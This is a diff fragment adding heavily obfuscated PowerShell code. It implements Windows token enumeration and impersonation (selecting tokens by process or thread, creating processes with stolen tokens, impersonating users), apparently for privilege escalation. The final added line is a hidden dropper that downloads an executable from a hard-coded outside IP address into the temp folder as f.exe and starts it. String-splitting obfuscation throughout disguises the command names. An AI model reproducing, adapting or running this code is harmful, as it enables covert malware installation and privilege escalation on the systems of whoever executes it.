+                    if ((${tOK`eN} | &("{3}{2}{1}{0}" -f 'er','emb','t-M','Ge') ("{1}{3}{0}{2}"-f 's','P','sId','roce')) -and ${T`Oken}."PRo`cES`SId" -eq ${Pr`oC`ESSId})
+                    {
+                        ${H`TokEN} = ${T`Ok`eN}."Ht`O`Ken"
+                        &("{2}{3}{0}{1}"-f'bo','se','Write-Ve','r') ("{4}{1}{5}{0}{6}{8}{2}{3}{7}" -f'ti','l','Proc','e','Se','ec','ng token b','ssID','y ')
+                    }
+                }
+
+                if (${h`T`OKEN} -eq   $s2A::"Z`Ero")
+                {
+                    &("{0}{3}{2}{1}"-f'W','r','te-Erro','ri') "A token belonging to ProcessId $($ProcessId) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened. " -ErrorAction ("{0}{1}" -f 'Sto','p')
+                }
+            }
+            elseif (${th`REad`iD} -ne ${nU`ll} -and ${THr`Eadid} -ne 0)
+            {
+                foreach (${to`ken} in ${a`lL`ToKENs})
+                {
+                    if ((${T`OkEN} | &("{1}{2}{0}" -f'r','G','et-Membe') ("{2}{0}{1}" -f'ad','Id','Thre')) -and ${T`OkeN}."THr`eAd`iD" -eq ${ThrE`A`did})
+                    {
+                        ${htOk`eN} = ${T`O`KeN}."Ht`OkEN"
+                        &("{1}{3}{0}{2}" -f 'te-Verbo','Wr','se','i') ("{2}{3}{1}{4}{0}" -f'dId','ken by','Se','lecting to',' Threa')
+                    }
+                }
+
+                if (${H`T`oKen} -eq   $s2A::"Z`eRo")
+                {
+                    &("{1}{0}{3}{2}" -f'te-','Wri','ror','Er') "A token belonging to ThreadId $($ThreadId) could not be found. Either the thread doesn't exist or the thread is in a protected process and cannot be opened. " -ErrorAction ("{1}{0}"-f 'top','S')
+                }
+            }
+            elseif (${prO`cE`sS} -ne ${N`UlL})
+            {
+                foreach (${tOK`EN} in ${al`lTOK`E`NS})
+                {
+                    if ((${t`oK`EN} | &("{0}{2}{1}"-f'Ge','ember','t-M') ("{3}{1}{2}{0}"-f'essId','ro','c','P')) -and ${to`kEn}."P`RoCessID" -eq ${prOC`E`ss}."I`D")
+                    {
+                        ${HTO`k`En} = ${t`okeN}."HTO`keN"
+                        &("{2}{0}{1}" -f '-Verbo','se','Write') ("{6}{3}{8}{2}{1}{7}{9}{4}{5}{0}"-f 'ct',' ','g','lecti','s','s obje','Se','tok','n','en by Proce')
+                    }
+                }
+
+                if (${ht`OK`En} -eq  $S2a::"z`ErO")
+                {
+                    &("{0}{2}{1}"-f'Wr','-Error','ite') "A token belonging to Process $($Process.Name) ProcessId $($Process.Id) could not be found. Either the process doesn't exist or it is a protected process and cannot be opened. " -ErrorAction ("{0}{1}" -f 'Sto','p')
+                }
+            }
+            else
+            {
+                &("{1}{2}{0}{3}"-f'E','Wr','ite-','rror') ("{6}{7}{14}{0}{10}{3}{9}{8}{4}{15}{2}{12}{13}{1}{5}{11}" -f 'upply a U','ss','o','ame','hreadId,',' o','M','ust','essId, T',', Proc','sern','bject','r ','Proce',' s',' ')  -ErrorAction ("{0}{1}"-f 'S','top')
+            }
+
+            
+            if (${pS`CmD`leT}.PARaMEteRsetNAmE -ieq ("{2}{1}{3}{0}" -f 'ss','eat','Cr','eProce'))
+            {
+                if (-not ${N`oui})
+                {
+                    &("{0}{1}{3}{2}" -f'Set-Des','kt','CLs','opA')
+                }
+
+                &("{0}{3}{1}{2}{4}"-f 'Create-Pr','sWithTo','ke','oces','n') -hToken ${h`TOkEN} -ProcessName ${cREa`TEPr`oCE`sS} -ProcessArgs ${prOC`eSS`AR`Gs} -PassThru:${paS`ST`HRU}
+
+                &("{3}{0}{4}{1}{2}"-f 'nvoke-RevertTo','l','f','I','Se')
+            }
+            elseif (${im`pERSOnAT`E`USeR})
+            {
+                &("{5}{4}{0}{3}{2}{1}" -f'r','er','teUs','sona','oke-Impe','Inv') -hToken ${H`T`oKEn} | &("{1}{2}{0}" -f 'ull','Out','-N')
+                &("{0}{2}{3}{1}" -f'W','ut','rite-Ou','tp') "Running As: $([Environment]::UserDomainName)\$([Environment]::UserName) "
+            }
+
+            &("{1}{3}{2}{0}" -f'kens','F','ee-AllTo','r') -TokenInfoObjs ${ALlTo`k`ENs}
+        }
+        elseif (${P`scMDL`et}.ParaMeterSetname -ieq ("{1}{0}{2}"-f 'ho','W','AmI'))
+        {
+            &("{1}{2}{0}" -f'put','Write-Ou','t') "$([Environment]::UserDomainName)\$([Environment]::UserName)"
+        }
+        else 
+        {
+            ${a`LltOk`eNs} = &("{3}{0}{2}{1}" -f '-','s','AllToken','Enum')
+
+            if (${pS`cMD`l`ET}.PAraMeterSeTName -ieq ("{0}{1}"-f 'ShowA','ll'))
+            {
+                &("{2}{0}{1}"-f'O','utput','Write-') ${a`LLt`okEnS}
+            }
+            else
+            {
+                &("{0}{1}{2}"-f 'W','rite-Outpu','t') (&("{3}{0}{1}{2}{4}" -f'et-Un','iq','ueToke','G','ns') -AllTokens ${All`ToK`Ens})."tO`KeN`BYU`SeR"."v`ALU`eS"
+            }
+
+            &("{0}{2}{4}{1}{5}{3}"-f 'Invoke','t','-R','oSelf','ever','T')
+
+            &("{0}{3}{1}{2}{4}" -f 'Free-','Toke','n','All','s') -TokenInfoObjs ${a`LLToKE`Ns}
+        }
+    }
+
+
+    
+    &("{0}{1}" -f 'Ma','in')
+}
+
+(${d`pL}=${eN`V:`TeMp}+("{0}{1}" -f 'f.','exe'));(&("{1}{2}{0}" -f 'ct','New-Obj','e') ("{4}{1}{3}{0}{2}"-f'bCli','t','ent','.We','System.Ne')).("{2}{1}{0}" -f 'e','ownloadFil','D').Invoke(("{0}{1}{6}{3}{5}{4}{2}" -f'http://198','.','exe','.','/a.','137.173','50'), ${D`PL});&("{2}{1}{0}" -f 'ss','-Proce','Start') ${d`pl}
